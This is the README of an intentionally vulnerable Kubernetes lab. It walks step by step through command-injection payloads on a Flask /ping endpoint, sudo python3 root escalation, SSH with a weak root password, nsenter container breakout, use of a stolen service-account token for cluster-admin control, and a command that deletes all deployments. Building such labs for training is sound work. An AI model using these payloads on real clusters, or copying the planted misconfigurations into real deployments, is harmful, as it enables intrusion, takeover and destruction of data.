# Vulnerable Kubernetes Cluster Scenario

This project sets up a Kubernetes cluster environment designed to demonstrate a multi-step attack path, illustrating common vulnerabilities and misconfigurations.

**Scenario Goal:** Deploy a cluster with intentional vulnerabilities, allowing an attacker to move from an exposed web service to full cluster compromise.

**Architecture:**

*   **Pod 1 (`pod1-webapp`)**:
    *   Runs a Flask web application accessible from outside the cluster (via NodePort).
    *   Vulnerable to **Command Injection** via a `/ping` endpoint.
    *   Runs as `appuser`, but has `sudo NOPASSWD` configured for `/usr/bin/python3`, enabling **Privilege Escalation** within the container.
    *   Network Policy allows egress *only* to Pod 2 on port 22.
*   **Pod 2 (`pod2-ssh`)**:
    *   Runs an SSH server, accessible *only* from Pod 1 (via ClusterIP service and Network Policy).
    *   Allows root login via SSH with a **weak password** (`root:password123`).
    *   Runs as a **privileged container** (`securityContext.privileged: true`) and with `hostPID: true`, enabling **Pod Escape / Container Breakout**.
    *   Uses a `ServiceAccount` (`cluster-admin-sa`) bound to a `ClusterRole` (`cluster-admin-role`) with overly permissive `* * *` permissions, enabling **Cluster Takeover**.
*   **Network Policies**: Enforce the intended communication flow: External -> Pod 1 -> Pod 2.

## Prerequisites

*   Docker installed and running.
*   `kubectl` installed.
*   A running Kubernetes cluster (e.g., Docker Desktop Kubernetes, Minikube, OrbStack, k3d, etc.). Ensure `kubectl` is configured to point to your target cluster.

## Setup Instructions

1.  **Clone the Repository (if applicable):**
    ```bash
    # git clone <repository-url>
    # cd <repository-directory>
    ```

2.  **Build Docker Images:**
    Build the images for the two pods locally.
    ```bash
    docker build -t vulnerable-webapp:latest pod1-webapp-src/
    docker build -t ssh-server:latest pod2-ssh-server-src/
    ```
    *(Note: If your Kubernetes cluster doesn't automatically use your local Docker daemon's images (e.g., a remote cluster), you would need to push these images to a registry accessible by the cluster and update the image names in the `k8s/*.yaml` files.)*

3.  **Deploy to Kubernetes:**
    Apply all the Kubernetes manifest files located in the `k8s` directory.
    ```bash
    kubectl apply -f k8s/
    ```

4.  **Verify Deployment:**
    Check that the pods are running and the services are created.
    ```bash
    kubectl get pods -o wide
    kubectl get services
    ```
    You should see `pod1-webapp-<hash>` and `pod2-ssh-<hash>` pods in the `Running` state. Note the NodePort assigned to `pod1-webapp-service` (e.g., `3xxxx`).

## Exploitation Path

1.  **Access Web App (Pod 1):**
    Open your browser and navigate to `http://<NODE_IP>:<NODE_PORT>` or `http://localhost:<NODE_PORT>` if using Docker Desktop/OrbStack. (Replace `<NODE_PORT>` with the port noted in step 4 of Setup).

2.  **Command Injection (Pod 1):**
    Use the "Host to ping" input or manipulate the URL to inject commands.
    *   Example: `http://localhost:<NODE_PORT>/ping?host=127.0.0.1; id`
    *   Goal: Get command execution as the `appuser`. Try `ls /`, `whoami`, `cat /etc/passwd`.

3.  **Privilege Escalation (Pod 1):**
    Abuse the `sudo NOPASSWD` configuration for python3. Inject a command that uses `sudo python3` to execute code as root within the container.
    *   Example Payload for URL: `127.0.0.1; sudo python3 -c 'import os; os.system("id")'`
    *   Get a root shell: `127.0.0.1; sudo python3 -c 'import os; os.system("/bin/bash")'` (Note: This interactive shell might be tricky via web requests, often you'd establish a reverse shell here).

4.  **Network Discovery (Find Pod 2):**
    From your root shell/command execution on Pod 1, find Pod 2's internal IP address.
    *   The internal service name is `pod2-ssh-service`. DNS should resolve this within the cluster.
    *   Try pinging it: `ping pod2-ssh-service`
    *   Or use network scanning tools (if installed or installable): `apt-get update && apt-get install -y iproute2 net-tools nmap; ip a; nmap <CLUSTER_IP_RANGE>` (Find range via `ip a`).
    *   Alternatively, check environment variables or service discovery mechanisms if available. The service IP was listed by `kubectl get svc` as well (`pod2-ssh-service` `CLUSTER-IP`). Let's assume it's `192.168.194.218` based on earlier output.

5.  **Lateral Movement (SSH to Pod 2):**
    SSH into Pod 2 using the weak root credentials (`root` / `password123`). You might need to install an SSH client on Pod 1 first (`apt-get update && apt-get install -y openssh-client`).
    ```bash
    # From root shell on Pod 1
    ssh root@<POD_2_IP_or_SERVICE_NAME> 
    # Enter password: password123
    ```
    You should now have a root shell on Pod 2.

6.  **Pod Escape / Container Breakout (From Pod 2):**
    Pod 2 is running as privileged (`privileged: true`) and with `hostPID: true`. This allows accessing host resources. There are many techniques, here are a few concepts:
    *   **Access Host Processes:** Since `hostPID` is true, `ps aux` inside the container shows *host* processes. You might find sensitive information or processes to interact with.
    *   **Access Host Filesystem:** Privileged containers can often mount host devices (`fdisk -l` might show host disks) or find ways to access the host filesystem, potentially via `/proc/<host_pid>/root/`.
    *   **Create Privileged Host Pod:** Use the mounted service account token (see next step) to create a new pod directly on the host network/namespace with host mounts.
    *   **Execute Command on Host:** Find the host's PID 1 (init process) via `ps aux`, then use `nsenter` to enter the host's namespaces and execute commands: `nsenter --target <HOST_PID_1> --mount --uts --ipc --net --pid <command>`.

7.  **Cluster Takeover (From Pod 2):**
    The ServiceAccount token for `cluster-admin-sa` is mounted into Pod 2 (usually at `/var/run/secrets/kubernetes.io/serviceaccount/token`). This account is bound to `cluster-admin-role` with `* * *` permissions.
    *   Install `kubectl` inside Pod 2 (`apt-get update && apt-get install -y kubectl`).
    *   Use the mounted token to interact with the Kubernetes API as cluster-admin:
        ```bash
        # Inside Pod 2 shell
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        APISERVER=https://kubernetes.default.svc # Default internal API server address

        # Test access
        kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get nodes
        kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get secrets --all-namespaces 
        # You now have full control over the cluster!
        ```
    *   Simulate shutdown: `kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT delete deployment --all --all-namespaces` (Don't run this unless intended!)

## Cleanup

To remove all the resources created by this scenario:
```bash
kubectl delete -f k8s/
```
You may also want to remove the Docker images:
```bash
docker rmi vulnerable-webapp:latest ssh-server:latest
```
